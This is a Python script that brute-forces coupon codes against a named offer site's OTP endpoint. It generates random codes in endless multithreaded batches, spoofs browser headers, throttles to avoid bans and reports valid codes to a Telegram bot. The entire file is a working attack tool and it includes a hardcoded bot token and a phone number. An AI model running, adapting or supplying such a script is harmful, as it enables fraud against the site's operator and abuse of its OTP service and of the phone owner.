import requests
import time
import random
import string
import json
import concurrent.futures
import threading
from typing import Dict

# ================== CONFIGURATION ==================
BASE_URL = "https://www.ossw.theofferclub.in"
OTP_ENDPOINT = f"{BASE_URL}/home/generateOTP"
NUM_CODES_PER_BATCH = 500        # codes per batch
MAX_WORKERS = 8                   # threads for checking
DELAY_PER_THREAD = 0.5            # seconds between requests (avoid bans)

# Telegram settings – use environment variables on Render
TELEGRAM_TOKEN = "8853159534:AAHljkPYZ3X6Ktx5c1UrHXJjZupvFji47DU"
TELEGRAM_CHAT_ID = "5177144784"

# Global variables (thread‑safe)
current_mobile = "9038529139"     # default – can be changed via bot
mobile_lock = threading.Lock()
print_lock = threading.Lock()

# ================== TELEGRAM HELPERS ==================
def send_telegram_message(text: str):
    """Send a plain text message to the configured chat."""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Telegram send error: {e}")

def poll_telegram_commands():
    """Background thread: listens for /setmobile commands."""
    last_update_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates"
            params = {"offset": last_update_id + 1, "timeout": 30}
            resp = requests.get(url, params=params, timeout=35)
            if resp.status_code == 200:
                updates = resp.json().get("result", [])
                for upd in updates:
                    last_update_id = upd["update_id"]
                    msg = upd.get("message")
                    if msg and "text" in msg:
                        text = msg["text"].strip()
                        chat = msg["chat"]["id"]
                        # Only accept commands from our own chat ID (security)
                        if str(chat) != TELEGRAM_CHAT_ID:
                            continue
                        if text.startswith("/setmobile"):
                            parts = text.split()
                            if len(parts) == 2 and parts[1].isdigit():
                                new_mobile = parts[1]
                                with mobile_lock:
                                    global current_mobile
                                    current_mobile = new_mobile
                                send_telegram_message(f"✅ Mobile number changed to `{new_mobile}`")
                            else:
                                send_telegram_message("❌ Usage: `/setmobile 9xxxxxxxxx`")
        except Exception as e:
            print(f"Polling error: {e}")
        time.sleep(1)

# ================== CODE GENERATION & VALIDATION ==================
def generate_random_code() -> str:
    prefix = "MGTQ"
    chars = string.ascii_uppercase + string.digits
    random_part = ''.join(random.choices(chars, k=6))
    return prefix + random_part

def check_code(code: str, mobile: str) -> Dict:
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": "https://www.ossw.theofferclub.in/",
        "Origin": "https://www.ossw.theofferclub.in",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {"phone": mobile, "ccode": code}
    start_time = time.time()
    try:
        response = requests.post(OTP_ENDPOINT, data=data, headers=headers, timeout=15)
        response_time = round((time.time() - start_time) * 1000, 2)
        result = {
            "code": code,
            "status_code": response.status_code,
            "response_time_ms": response_time,
            "valid": False,
            "message": "",
        }
        if response.status_code == 200:
            try:
                json_resp = response.json()
                if json_resp.get("status") == "success":
                    result["valid"] = True
                    result["message"] = "✅ VALID - OTP Sent"
                elif json_resp.get("status") == "failure":
                    result["message"] = f"❌ {json_resp.get('msg1', 'failure')}"
                elif json_resp.get("status") == "code_failure":
                    result["message"] = "❌ Invalid code"
                else:
                    result["message"] = f"❌ {json_resp.get('status')}"
            except:
                result["message"] = "❌ JSON parse error"
        else:
            result["message"] = f"❌ HTTP {response.status_code}"
        return result
    except Exception as e:
        return {
            "code": code,
            "status_code": 0,
            "response_time_ms": round((time.time() - start_time) * 1000, 2),
            "valid": False,
            "message": f"❌ Error: {str(e)}",
        }

def process_code(code: str):
    with mobile_lock:
        mobile = current_mobile
    result = check_code(code, mobile)
    with print_lock:
        print(f"🔍 {code} → {result['message']}")
    if result["valid"]:
        msg = f"🎉 VALID CODE FOUND!\n📱 Mobile: {mobile}\n🔑 Code: {code}\n⏱️ {time.strftime('%Y-%m-%d %H:%M:%S')}"
        send_telegram_message(msg)
        with open("valid_codes.txt", "a") as f:
            f.write(f"{code} | {mobile} | {time.ctime()}\n")
    time.sleep(DELAY_PER_THREAD)
    return result

def run_batch(codes):
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(process_code, code) for code in codes]
        for f in concurrent.futures.as_completed(futures):
            try:
                f.result()
            except Exception as e:
                print(f"Thread error: {e}")

# ================== MAIN LOOP (NEVER STOPS) ==================
if __name__ == "__main__":
    send_telegram_message("🚀 OTP Code Validator started!\nUse /setmobile 9xxxxxxxxx to change target number.")
    
    # Start Telegram command polling in background
    telegram_thread = threading.Thread(target=poll_telegram_commands, daemon=True)
    telegram_thread.start()
    
    print("Continuous validation running. Press Ctrl+C to stop.")
    while True:
        try:
            # Generate a batch of codes
            codes = [generate_random_code() for _ in range(NUM_CODES_PER_BATCH)]
            print(f"\n📦 Generated {len(codes)} codes. Checking...")
            run_batch(codes)
            # Small gap between batches
            time.sleep(2)
        except KeyboardInterrupt:
            print("\n🛑 Stopped by user.")
            break
        except Exception as e:
            error_msg = f"❌ Main loop error: {e}"
            print(error_msg)
            send_telegram_message(error_msg)
            time.sleep(10)
